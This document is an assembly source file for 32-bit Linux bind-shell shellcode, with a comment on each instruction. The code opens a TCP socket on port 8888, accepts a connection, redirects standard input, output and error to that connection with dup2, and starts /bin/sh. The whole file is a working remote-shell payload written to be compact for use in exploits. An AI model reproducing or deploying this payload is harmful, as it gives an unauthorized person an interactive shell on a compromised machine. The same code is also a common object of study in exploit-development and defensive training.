global	_start

section	.text
_start:
;=======================================================
;=================== SocketCall=========================
; SocketCall(int call, unsigned long *args)
; 102(EAX)  (1(EBX),{Pointer to Args}(ECX))
; {Args}--> socket(AF_INET, SOCK_STREAM,0)
; {Args}-->		2	1	0
;=======================================================
;SYS_SOCKET
xor ebx,ebx 	; Clearing EBX Register
xor eax,eax 	; Clearing EAX Register
mov al,102  	; Moving SocketCall to EAX(Sys Call Number= 102) 
inc bl		; (Saving 1 Byte) Moving 1 to EBX with a Byte Less (SYS_SOCKET)	
push esi	; Pushing 0 onto the stack(0: IPPROTO_IP)
push byte 1	; Pushing 1 onto the stack(1: SOCK_STREAM)
push byte 2	; Pushing 2 onto the stack(2: AF_INET)
mov ecx,esp	; Load pointer to the stack structure to ECX
int 0x80	; Calling Interrupt

;SYS_BIND
xchg edi,eax	; (Saving 1 Byte) Saving the Result After Syscall from EAX to EDI
push esi	; Zero Pushed onto the Stack
push word 0xb822; Port 8888 Pushed onto the Stack
push word 2	; 2 Pushed onto the Stack
mov ebx,esp	; Top of the stack stored to EBX--->{0xb8220002,0}
push byte 16	; 16 Pushed onto the Stack
push ebx	; Pointer ---> {Port,0}
push edi	; EDI Points to Result from SocketCALL
xor ebx,ebx	; Clearing EBX
mul ebx		; Clearing EAX
mov al,102	; SOCKETCALL
mov bl,2	; Call --> SYS_BIND
mov ecx,esp	; Pointer to Structures in Stack(Top)
int 0x80	; Calling Interrupt

;SYS_LISTEN
push esi	; Zero Pushed onto the Stack
push edi	; socketfd pushed onto the stack
xor ebx,ebx	; Clearing EBX
mul ebx		; Clearing EAX
mov al,102	; SOCKETCALL
mov bl,4	; Call --> SYS_LISTEN
mov ecx,esp	; Pointer to Structures in Stack(Top)
int 0x80	; Calling Interrupt

;SYS_ACCEPT
xor ebx,ebx	; Clearing EBX
mul ebx		; Clearing EAX
push esi	; Pushing 0
push esi	; Pushing 0
push edi	; Push socketfd
mov al,102	; SOCKETCALL
mov bl,5	; Call --> SYS_ACCEPT
mov ecx,esp	; Pointer to Structures in Stack(Top)
int 0x80	; Calling Interrupt

;DUP2
xchg ebx,eax	; 
xor ecx,ecx	; Clearing ECX
mov cl,2	; Moving 2 to ECX

loop:		
	mov al,63	; Calling DUP2
	int 0x80	; Calling Interrupt
	dec ecx		; Dec ECX
	jns loop	; Jump to loop until SF==0
done:
	;EXECVE
	xor eax,eax	
	push eax	; 0
	push 0x68732f2f	; //sh
	push 0x6e69622f	; /bin
	mov ebx,esp	; Pointer to Structures in Stack(Top)
	mov ecx,eax	; 0 to ECX
	mov edx,eax	; 0 to EDX
	mov al,11	; EXECVE CALL
	int 0x80	; Interrupt
